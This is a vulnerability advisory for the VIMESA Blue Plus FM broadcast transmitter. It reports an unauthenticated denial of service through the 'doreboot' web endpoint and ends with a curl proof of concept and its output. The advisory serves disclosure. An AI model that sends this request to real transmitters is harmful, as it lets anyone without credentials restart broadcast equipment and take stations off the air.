(VIMESA)\nProduct web page: https://www.vimesa.es\nAffected version: img:v9.7.1 Html:v2.4 RS485:v2.5\n\nSummary: The transmitter Blue Plus is designed with all\nthe latest technologies, such as high efficiency using\nthe latest generation LDMOS transistor and high efficiency\npower supplies. We used a modern interface and performance\nusing a color display with touch screen, with easy management\nsoftware and easy to use. The transmitter is equipped with\nall audio input including Audio IP for a complete audio\ninterface. The VHF/FM transmitter 30-1000 is intended\nfor the transmission of frequency modulated broadcasts\nin mono or stereo. It work with broadband characteristics\nin the VHF frequency range from 87.5-108 MHz and can be\noperated with any frequency in this range withoug alignment.\nThe transmitter output power is variable between 10 and 110%\nof the nominal Power. It is available with different remote\ncontrol ports. It can store up to six broadcast programs\nincluding program specific parameters such as frequency,\nRF output power, modulation type, RDS, AF level and deviation\nlimiting. The transmitter is equipped with a LAN interface\nthat permits the complete remote control of the transmitter\noperation via SNMP or Web Server.\n\nDesc: The device is suffering from a Denial of Service (DoS)\nvulnerability. An unauthenticated attacker can issue an \nunauthorized HTTP GET request to the unprotected endpoint\n'doreboot' and restart the transmitter operations.\n\nTested on: lighttpd/1.4.32\n\n\nVulnerability discovered by Gjoko 'LiquidWorm' Krstic\n                            @zeroscience\n\n\nAdvisory ID: ZSL-2023-5798\nAdvisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2023-5798.php\n\n\n22.07.2023\n\n--\n\n\n$ curl -v \"http://192.168.3.11:5007/doreboot\"\n*   Trying 192.168.3.11:5007...\n* Connected to 192.168.3.11 (192.168.3.11) port 5007 (#0)\n> GET /doreboot HTTP/1.1\n> Host: 192.168.3.11:5007\n> User-Agent: curl/8.0.1\n> Accept: */*\n>\n* Recv failure: Connection was reset\n* Closing connection 0\ncurl: (56) Recv failure: Connection was reset\n            "}
